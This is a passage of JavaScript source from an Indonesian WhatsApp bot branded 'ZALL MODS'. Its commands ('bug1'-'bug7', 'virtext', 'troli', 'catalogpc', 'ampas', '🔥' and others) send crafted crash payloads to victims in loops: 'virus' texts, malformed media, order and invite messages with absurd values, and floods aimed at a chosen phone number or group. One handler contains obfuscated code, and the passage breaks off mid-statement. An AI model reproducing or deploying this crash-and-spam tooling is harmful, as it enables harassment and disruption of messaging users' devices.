haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone3}` }, { quoted: doc })
}
}
break
case 'virtext5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone4}` }, { quoted: doc })
}
}
break
case 'virtext6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone5}` }, { quoted: doc })
}
}
break
case 'virtext7': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone6}` }, { quoted: doc })
}
}
break
case 'virtext8': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${buttonkal}` }, { quoted: doc })
}
}
break
case 'virtext9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'virtext10': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'bug1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
}
break
//=================================================//
case 'bug2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© ZALL MODS${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
}
break
//=================================================//
case 'bug3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© ZALL MODS${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'bug4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© ZALL MODS`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© ZALL MODS${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'bug5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break
//=================================================//
case 'bug6': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6285714170944",
"matchedText": "https://wa.me/c/6285714170944",
"description": "Developer ZALL MODS\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© ZALL MODS${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'bug7': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© ZALL MODS${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:ZALL\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAGAAYAMBIgACEQEDEQH/xAAcAAACAwEAAwAAAAAAAAAAAAAFBgMEBwIAAQj/xAAzEAACAQMDAwIDBwQDAQAAAAABAgMABBEFEiEGMUETUSJhgQcyUnGRocEUQrHwFXLRI//EABkBAAIDAQAAAAAAAAAAAAAAAAECAAMEBf/EACARAAICAgMBAQEBAAAAAAAAAAABAhEDIRIxQQRhIkL/2gAMAwEAAhEDEQA/AM9O1rrbGD6UR2rnzz3q6dQS0UYO5lwf0PmqD/8AxB+Hmg17ekMVVst7+1Y+DySOhzWONhO61h1ZfjJYFgu3uwbxUcVvfXKgliqBdo8nb7GqmlWxllWWQbjnPPk0+aVboFUsBxzVvGMdIr5ynt9C/b9MXM0W6QysSuOTj8qtv0dOyepGhUAB87ueDz+1O0dzEi4yB/7VpLxGRVBGACPp3qWShSt/s6up2b022gJkfEfPio7/AKB1awVngdmK+Ac8Af4rRrDUQqLk4JAz+lETepKOcGi6oitMw+HXtU0iYC5ZwA2SG5BP8U/6B1PDfKvZX/uXPb/c1Y6m6Ug1exkliRVl2nx3rHrS8udE1NkOQYnKlTVUsEZq49lkc8oOpbR9H2zhosg5BORU9LHRmrjUtOyTyo7E5xTMTW35pXiSfmjnfVGsrr3Z89dQuIr66VAFCysAPYbjSqd0svuzGm/ruxk03qC9gcEBpCyH8Sscg/v+1LumW7XF/GgHAO4/ICqoRpF2SVtIY9OgEcagDsAKPQTGNQBQZrlLVgm0s2OceK8XVdzbVib6mkpvZZGSQeM5ZQc8ipobk7lGeGIFBYLh3+J0IHtV9ASvHfuD86UsTsZoJPgGD+tFbVl2h3kVR5yaS5bmZol9NyoA5qpEbm4uVQSsxz+dMC2atbTQSExiRWzwOeKxn7R9I/4/qZpVXEVwoYY9+x/xWk6RBGsarLJlhzw3NUvtF0dbzpZr1fjktSG3eduef80YumJNNx2DvsoWVrW7chvTXCgnsT3rRmbarE+Bmkr7OrlRoEdrtUMi71ZRjcrHz8wQR+lN8rZjYZ5PFasUaiYssuUgD1v0xZ9Q6eHkf0rmEZSYDPw98MPIzWQ9NW/pX14kikPF8JBGCCCQf8Vv0qCVWR+3HasTS0lsupb15QQJpnRs/i4b98mlyrVobFK3TJGt4YNzuAckszNQufXLKOQoFZseVXii9/ZtdQlA7Kp7geaCXWgyXCRgbYyg27h2I/KqIpPs1Pl/kI2moRzIJI23KfBGCKNW59XAUZJ7AUHsNN2mNBlgiFM+DznJ9zmm/pywVrtEfxStK9Dq/QVqEE0MaqEOWOKSNTvr/wDqjDG8scRbaqxHlsHBzjuc+K3/AFPQ4ZYGQqM44OKSZtCu4bwtG+4E+VGRRi0nskouSq6KnT/SeqMbVoL/ANItGrusy7treQCOa0DW7JoujdRt52DH+kk3NjuQpP8AFQaDavaoGlbkdhV3qGb19Du4u++Mpj/tx/NRtOWg1URJ+z1DFpUbt97G0j25/wB/WnZ2zge7ClnQIBbRPGo2qrYA8dhTBuy6/U1rj0c6W2Xn4dgP7vNIl1pK3t9qceCHcrPC3sy5A/gfWtLubVDDJIq7WVS3yNIt7qVjp15A00qs7owKp8TZ74+XejKq2LjbbuIoE4xuUqfKkYIPtUsVss5GMmutVvIr6+kuYUaNXIJVjk58n61xaXBjbFYpaejpw2rLbwpawkgAY5q707cYvix+EYyM+RVG+nElq2CMmhJv7lLmIKFWJV2k5Ib6eKAapm1llvLYCNhuI7ml8XCi5ZJVCupwQaSbPV9Vu7qGO0vHiCsA2VByPn7CmHUZvSkWVpN0h+83bJqBpIZUnh28KBQHqvV4NN0xJpg5RplXCDJ7E9vpVaLUcqMN3pf6yuf6mK2td2fiMjD28D+akXuyTj/LCehdQ6Tcq6x30SyMxISRtrEceDTMjhmyDkbeDWLPpCSxrgbiRk5FSQNquj82Oo3ELfgRtyn6HitMcq9MTwvtG09a9QPFozQWMbCOYmMz+O3IHzrJLm5jEMRLZdQGAXv25rZtU02PWelZrGMbSY90ZXjDDkf786xWysXmlMWwqVJViR93B80mVNyQMHFRf4T2LT3bM5CxxL3Hck1cTvXqVBaosEZC7clSf7h7H5/xVUTurAhePIPmq5RpF0MtP8Lc7FYicE45oLcXjB9oRx8yOKLC4juAY8lZAM7W4OPce4/KuPSQHlQfzFL0XKSbs503VLtQEs7RWkbIckY/KrUp1QSK14Aqk/dHirulxW0cocuwc+BwKNGyl1K4jtoV3yOcAAcAe5+VRbHnKPaVAaK6EMe4ngUFuJHvbhp3bhuF/Ktgk6EsJdBOmhCtw2HN2y4Yt7Y8L4xWUXNhNbXsltOm14WKOvgEHFNKDj2UxyrJqPhEAANkY/M+K9D0o3+I7mPnFdSOqDaoGaqbyWOOT+KgFmwdM6tHcaRHOXAQLuJJ7ACka8eBtWunhj9OKdzKvPPz/wDfrXOmR3GnWElgs7Pbs2VyMNj8J+teXNtI4wgyyncPzrTJuqZhSVtorvAk4IIxk/pXEdksTfGufZsUQgtpDGH2HB/arMcRwQRz86Sh0wVNp1tfLtk+8v3WU4ZT8jUTaffWq59NbmP3HDAfzTAIlByRwfNTRpxyc4pXGx4za6ANhbpcTBPSeNvwk8/pWodL2SWNiriMJM7Esx+8R4BP8UB06Met6hxkcZprsQzDI4jA4Pzp8cKdiZsrlHiEpztIYnIPNZN9o9utv1CtwpCi4gWR/wDsCVP64Fafcy5QckkVl32k75NZssn4f6YY+XxNRy9C/O3yElmaRuMgVLHHkH2Hc11HCWPHC+9ShVJ2g4UcVmbN8Y+n/9k=\nX-WA-BIZ-DESCRIPTION:Developer ZALL MODSWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:ZALL\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
}
break
//=================================================//
case 'lokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© ZALL MODS${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'buglokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ZALLZALL MODS${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
}
break
//=================================================//
case 'buginvite': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME ZALL MODS${ngazap(prefix)}`,
"groupName": `MY NAME ZALL MODS${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'troli': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ZALL MODS${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© ZALL MODS${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'catalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© ZALL MODS${ngazap(prefix)}`,
"description": `© ZALL MODS`,
"currencyCode": "IDR",
"footerText": `© ZALL MODS`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ZALL MODS WE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
//=================================================//
case 'catalogpc': case 'cataloggc':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© ZALL MODS${ngazap(prefix)}`,
"description": `© ZALL MODS`,
"currencyCode": "IDR",
"footerText": `© ZALL MODS`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© ZALL MODS WE ARE NOT MASTOD`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
break
//=================================================//
case 'jagoanom' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
//=================================================//
/*BUG WACAP */
case 'ampas1' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas2' : {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(10000)
}
break
//=================================================//
case '🔥': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
mm = text.split("|")[0]+'@s.whatsapp.net'
jumlah = text.split("|")[1]
let secon = text.split("|")[2]
a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
for (let i = 0; i < jumlah ; i++){
function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20ZALL\x20MODS','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','ZALL\x20MODS','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','6017EGBulL','1073458pGrfkv','6dptURc','6285714170944','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await 